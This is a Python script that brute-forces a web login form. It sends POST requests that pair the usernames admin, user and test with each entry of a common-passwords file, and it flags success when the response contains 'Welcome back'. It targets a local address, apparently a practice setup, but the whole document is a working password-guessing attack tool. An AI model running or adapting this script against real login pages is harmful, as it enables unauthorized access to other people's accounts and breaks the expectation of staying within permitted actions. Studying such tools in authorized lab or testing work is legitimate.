import requests
import sys

target = "http://127.0.0.1:5000"  # Target URL to send POST requests
usernames = ["admin", "user", "test"]  # List of usernames to try
passwords = "2023-200_most_used_passwords.txt"  # File containing passwords to try
needle = "Welcome back"  # Needle to search in response content for successful login message

# Iterate through each username
for username in usernames:
    with open(passwords, "r") as passwords_list:
        # Iterate through each password in the passwords list file
        for password in passwords_list:
            password = password.strip("\n").encode()  # Strip newline and encode password
            sys.stdout.write("[X] Attempting user:password -> {}:{}".format(username, password.decode()))
            sys.stdout.flush()
            
            try:
                # Send POST request to the target with current username and password
                r = requests.post(target, data={"username": username, "password": password})
                
                # Check if needle string is in response content indicating successful login
                if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
                    sys.exit()  # Exit script if valid password found
                
                else:
                    sys.stdout.write("\n")  # Move cursor to new line if no valid password found
                
            except requests.exceptions.RequestException as e:
                sys.stdout.write("\n")
                sys.stdout.write("\t[!] Error occurred: {}\n".format(e))
                continue  # Continue to next password attempt in case of error

# If no valid password found for any user
sys.stdout.write("\n")
sys.stdout.write("\tNo password found for any user!\n")

